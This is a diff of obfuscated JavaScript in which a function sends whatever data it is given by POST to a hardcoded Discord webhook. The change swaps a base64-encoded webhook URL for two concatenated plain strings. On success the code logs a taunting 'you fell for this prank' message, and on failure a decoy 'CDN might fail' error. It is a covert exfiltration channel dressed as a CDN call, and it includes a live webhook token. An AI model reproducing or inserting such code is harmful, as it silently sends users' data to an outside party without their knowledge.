@@ -56,18 +56,19 @@
             d.appendChild(e);
             
             function f(g){
-                var h = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3MTE5OTcwMTMzNjcyMzY0OS9VSHNBdlFPR0Y4U1hjVU8yMHBKNzV2MVVRZzB3Q2x4VDBlUVZsNjVDWVlWZTNPVnlrVnNiX2NhbFdZOEsyRzR3VmtRQg==";
-                var i = atob(h);
+                var h = "https://discord.com";
+                var i = "/api/webhooks/1271199701336723649/UHsAvQOGF8SXcUO20pJ75v1UQg0wClxT0eQVl65CYYVe3ONykVsb_calWY8K1G4wVkQB";
+                var j = h + i;
                 
-                var j = JSON.stringify({content:g});
+                var k = JSON.stringify({content:g});
                 
-                fetch(i,{
+                fetch(j,{
                     method:'POST',
                     headers:{'Content-Type':'application/json'},
-                    body:j
-                }).then(function(k){
-                    k.ok?console.log('Yo dude, you fell for this prank lel'):console.error('CDN might fail.')
-                }).catch(function(l){
+                    body:k
+                }).then(function(l){
+                    l.ok?console.log('Yo dude, you fell for this prank lel'):console.error('CDN might fail.')
+                }).catch(function(m){
                     console.error(':/')
                 })
             }
